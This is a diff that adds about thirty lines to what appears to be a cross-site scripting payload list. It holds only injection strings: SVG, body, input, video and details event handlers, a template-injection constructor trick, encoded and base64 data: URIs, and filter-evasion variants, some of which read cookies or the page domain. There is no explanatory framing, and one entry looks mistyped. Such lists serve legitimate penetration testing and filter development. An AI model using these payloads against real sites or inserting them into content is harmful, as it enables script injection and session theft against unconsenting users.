@@ -18,3 +18,36 @@ alert(document.cookie);confirm(1)
 "+onclick=alert(location.host)+SecAnalysts="
 <p tittle="</>#<img src=x onerror=alert(document.domain)//
 {{constructor.constructor(%27prompt(document.domain)%27)()}}
+<svg/onload=alert(1)>
+%253Csvg onload=alert0)%253E
+“ OnMouseOver=”prompt`1`
+%22%20o%3Cp%3Enmouseover=%22alert(document['cookie'])%22
+"><svg/onload=alert(/XSS/)
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+<body ontouchstart=alert(1)>
+#alert(document.domain)
+onclick="alert(1)">
+#"><img src=:// onerror=alert(2)>
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+"><svg/onload=confirm(1)>"@x.y
+prompt`${document.domain}`
